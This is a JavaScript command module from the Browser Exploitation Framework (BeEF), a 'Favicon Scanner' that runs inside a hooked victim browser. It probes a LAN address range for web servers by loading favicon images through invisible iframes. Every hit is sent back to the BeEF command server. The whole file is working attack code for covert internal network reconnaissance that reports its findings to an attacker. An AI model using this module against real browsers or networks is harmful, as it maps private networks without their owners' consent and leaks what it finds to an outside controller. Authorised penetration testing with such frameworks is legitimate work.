//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  var ips = new Array();
  var proto = 'http';
  var ipRange = "<%= @ipRange %>";
  var port   = "<%= @rport %>";
  var timeout = "<%= @timeout %>";
  var wait = "<%= @wait %>";
  var threads = "<%= @threads %>";
  var urls = new Array('/favicon.ico', '/favicon.png');

  // set target IP addresses
  if (ipRange != null){
    // ipRange will be in the form of 192.168.0.1-192.168.0.254
    // the fourth octet will be iterated.
    // (only C class IP ranges are supported atm)
    ipBounds   = ipRange.split('-');
    lowerBound = ipBounds[0].split('.')[3];
    upperBound = ipBounds[1].split('.')[3];
    for (i=lowerBound;i<=upperBound;i++){
      ipToTest = ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i;
      ips.push(ipToTest);
    }
  }

  checkFavicon = function(proto, ip, port, uri) {
    var img = new Image;
    var dom = beef.dom.createInvisibleIframe();
    beef.debug("[Favicon Scanner] Checking IP [" + ip + "] (" + proto + ")");
    img.src = proto+"://"+ip+":"+port+uri;
    img.onerror = function() { dom.removeChild(this); }
    img.onload = function() {
      beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto='+proto+'&ip='+ip+'&port='+port+"&url="+escape(this.src));dom.removeChild(this);
      beef.debug("[Favicon Scanner] Found HTTP Server [" + escape(this.src) + "]");
    }
    dom.appendChild(img);
    // stop & remove iframe
    setTimeout(function() {
      if (dom.contentWindow.stop !== undefined) {
        dom.contentWindow.stop();
      } else if (dom.contentWindow.document.execCommand !== undefined) {
        dom.contentWindow.document.execCommand("Stop", false);
      }
      document.body.removeChild(dom);
    }, timeout*1000);
  }

  WorkerQueue = function(frequency) {

    var stack = [];
    var timer = null;
    var frequency = frequency;
    var start_scan = (new Date).getTime();

    this.process = function() {
      var item = stack.shift();
      eval(item);
      if (stack.length === 0) {
        clearInterval(timer);
        timer = null;
        var interval = (new Date).getTime() - start_scan;
        beef.debug("[Favicon Scanner] Worker queue is complete ["+interval+" ms]");
        return;
      }
    }

    this.queue = function(item) {
      stack.push(item);
      if (timer === null) {
        timer = setInterval(this.process, frequency);
      }
    }

  }

  // create worker queue
  var workers = new Array();
  for (w=0; w < threads; w++) {
    workers.push(new WorkerQueue(wait*1000));
  }

  // for each favicon path
  for (var u=0; u < urls.length; u++) {
    var worker = workers[u % threads];
    // for each LAN IP address
    for (var i=0; i < ips.length; i++) {
      worker.queue('checkFavicon("'+proto+'","'+ips[i]+'","'+port+'","'+urls[u]+'");');
    }
  }

});
